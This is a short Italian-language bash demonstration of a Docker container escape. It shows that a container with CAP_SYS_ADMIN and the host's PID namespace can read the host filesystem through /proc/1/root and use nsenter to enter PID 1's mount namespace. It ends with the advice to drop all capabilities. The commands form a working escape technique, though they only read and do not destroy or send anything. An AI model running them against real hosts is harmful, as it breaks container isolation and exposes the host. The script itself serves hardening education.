#!/bin/bash
# 05_cap_sys_admin_escape.sh — CAP_SYS_ADMIN: "the new root"
#
# Dimostra che CAP_SYS_ADMIN + visibilita' PID host
# permette di entrare nel namespace dell'host
# senza --privileged, senza docker.sock, senza exploit.
#
# Uso:
#     chmod +x 05_cap_sys_admin_escape.sh
#     ./05_cap_sys_admin_escape.sh

set -e

SEP="============================================================"

echo ""
echo "$SEP"
echo "  STEP 1: Container normale — cosa vede /proc"
echo "$SEP"
echo ""

echo "> Container senza capability extra, PID namespace isolato:"
echo ""

docker run --rm alpine sh -c '
    echo "Processi visibili: $(ls /proc | grep -c "^[0-9]")"
    echo ""
    echo "PID 1 nel container:"
    cat /proc/1/cmdline 2>/dev/null | tr "\0" " "
    echo ""
    echo ""
    echo "/proc/1/root (il mio filesystem):"
    ls /proc/1/root/ 2>/dev/null | head -5
    echo ""
    echo "[*] Vedo solo i miei processi. /proc/1 sono io."
'

echo ""
echo "$SEP"
echo "  STEP 2: Container con CAP_SYS_ADMIN + hostPID"
echo "$SEP"
echo ""

echo "> Stessa immagine, ma con --cap-add SYS_ADMIN e --pid=host:"
echo "> (niente --privileged)"
echo ""

docker run --rm --cap-add SYS_ADMIN --pid=host alpine sh -c '
    echo "Processi visibili: $(ls /proc | grep -c "^[0-9]")"
    echo ""
    echo "PID 1 (processo host):"
    cat /proc/1/cmdline 2>/dev/null | tr "\0" " "
    echo ""
    echo ""
    echo "--- /proc/1/root: il filesystem dell'"'"'host ---"
    ls /proc/1/root/ 2>/dev/null | head -20
    echo ""
    echo "--- /proc/1/root/etc/os-release ---"
    cat /proc/1/root/etc/os-release 2>/dev/null | head -3
    echo ""
    echo "[!] Sto guardando il filesystem dell'"'"'host attraverso /proc/1/root"
    echo "[!] Senza --privileged. Senza docker.sock. Senza exploit."
'

echo ""
echo "$SEP"
echo "  STEP 3: nsenter — entrare nel namespace dell'host"
echo "$SEP"
echo ""

echo "> Con nsenter posso entrare nel mount namespace di PID 1:"
echo ""

cat > /tmp/_nsenter_escape.sh << 'NSSCRIPT'
echo "[*] Entro nel mount namespace di PID 1 (host)..."
echo ""
nsenter --target 1 --mount sh -c '
    echo "[+] Sono nel mount namespace dell host"
    echo ""
    echo "--- hostname ---"
    hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "(non disponibile)"
    echo ""
    echo "--- filesystem root ---"
    ls / | head -20
    echo ""
    echo "--- /etc/os-release ---"
    cat /etc/os-release 2>/dev/null | head -3
    echo ""
    echo "--- mount points ---"
    mount 2>/dev/null | head -5
' 2>/dev/null || echo "[-] nsenter bloccato (seccomp o AppArmor attivi)"
NSSCRIPT

docker run --rm --cap-add SYS_ADMIN --pid=host \
    -v /tmp/_nsenter_escape.sh:/run.sh:ro \
    alpine sh /run.sh

echo ""
echo "$SEP"
echo "  STEP 4: Cosa serve per questo escape"
echo "$SEP"
echo ""
echo "  Serve:"
echo "    CAP_SYS_ADMIN          (capability singola)"
echo "    + visibilita' PID host (--pid=host o hostPID in K8s)"
echo ""
echo "  NON serve:"
echo "    --privileged"
echo "    docker.sock"
echo "    exploit kernel"
echo "    CVE"
echo ""
echo "  Per questo CAP_SYS_ADMIN e' chiamata 'the new root'."
echo "  La regola: --cap-drop ALL, poi aggiungi solo quello che serve."
echo ""
